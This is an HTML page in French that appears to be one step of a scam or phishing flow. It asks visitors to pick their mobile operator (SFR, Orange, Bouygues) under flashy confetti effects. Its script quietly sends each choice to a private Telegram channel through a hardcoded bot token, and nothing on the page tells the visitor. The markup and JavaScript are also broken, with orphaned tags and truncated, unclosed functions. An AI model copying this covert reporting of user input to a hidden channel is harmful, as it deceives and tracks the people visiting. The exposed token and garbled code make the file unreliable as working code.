<!DOCTYPE html>

<head>

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
        html,body{height:100%;overflow:hidden;background:#000;color:#fff;}
        body{display:flex;align-items:center;justify-content:center;padding:20px;position:relative;}
        .back{position:absolute;top:20px;left:20px;color:#8B00FF;font-size:1.6em;text-decoration:none;z-index:10;}
        .container{max-width:380px;width:100%;position:relative;z-index:2;}
        .card{background:transparent;padding:0;}
        h1{font-size:2.2em;font-weight:900;color:#8B00FF;text-align:center;margin-bottom:20px;text-shadow:0 0 30px #8B00FF;}
        p{color:#aaa;text-align:center;font-size:1.1em;margin-bottom:40px;}
        .operators{display:flex;flex-direction:column;gap:20px;align-items:center;}
        .op-btn{background:rgba(20,20,30,0.7);backdrop-filter:blur(15px);border:2px solid rgba(139,0,255,0.3);border-radius:20px;padding:25px 40px;width:100%;transition:all 0.4s ease;box-shadow:0 10px 30px rgba(139,0,255,0.2);cursor:pointer;position:relative;overflow:hidden;}
        .op-btn:active{transform:scale(0.96);}
        .op-btn:hover{border-color:#8B00FF;box-shadow:0 0 50px rgba(139,0,255,0.5);background:rgba(139,0,255,0.1);}
        .op-name{font-size:2em;font-weight:900;text-shadow:0 0 20px currentColor;}
        .sfr{color:#e60000;}
        .orange{color:#ff7900;}
        .bouygues{color:#005eb8;}
        .autre{color:#666;font-size:1.8em;}
        /* Animation de fou pour "Autres" */
        .autre-btn{position:relative;overflow:hidden;}
        .autre-btn::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at center, rgba(255,0,0,0.3) 0%, transparent 70%);opacity:0;transition:opacity 0.6s;}
        .autre-btn:hover::before{opacity:1;animation:warningRipple 1.5s infinite;}
        @keyframes warningRipple{0%{transform:scale(1)}50%{transform:scale(1.3)}100%{transform:scale(1)}}
        .autre-btn .warning-icon{position:absolute;top:-10px;right:-10px;font-size:2em;animation:warningShake 1s infinite;}
        @keyframes warningShake{0%,100%{transform:rotate(0)}25%{transform:rotate(-10deg)}75%{transform:rotate(10deg)}}
        .warning{color:#ff4444;font-size:1.2em;font-weight:900;margin-top:30px;text-align:center;display:none;animation:warningPulse 1s infinite;}
        @keyframes warningPulse{0%,100%{opacity:1}50%{opacity:0.6}}
        .loader{display:none;width:50px;height:50px;border:6px solid #1a1a1a;border-top:6px solid #8B00FF;border-radius:50%;animation:spin 1s linear infinite;margin:30px auto;}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        canvas{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1;}
    </style>
</head>
<body>
    <canvas id="confetti"></canvas>
    <a href="plans.html" class="back">‚Üê</a>

                </div>

                <div class="op-btn orange" onclick="selectOperator('Orange')">
                    <div class="op-name orange">Orange</div>
                </div>

                <div class="op-btn bouygues" onclick="selectOperator('Bouygues')">

    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <script>
        setInterval(() => {
            confetti({
                particleCount: 20,
                spread: 80,
                origin: { x: Math.random(), y: Math.random() },
                colors: ['#8B00FF', '#ff00ff']

        function selectOperator(op) {
    localStorage.setItem('selectedOperator', op);

    // Envoi op√©rateur choisi au canal priv√©
    fetch(`https://api.telegram.org/bot8093456348:AAH7qkyDnquHF5sy8kb2W0H8TmWkNzJ_aFo/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
            chat_id: "-1003550552109",

}

        function selectOther() {
            document.getElementById('warning').style.display = 'block';
            setTimeout(() => {
                window.location.href = 'index.html';
            }, 5000);
        }
    </script>
</body>
</html>
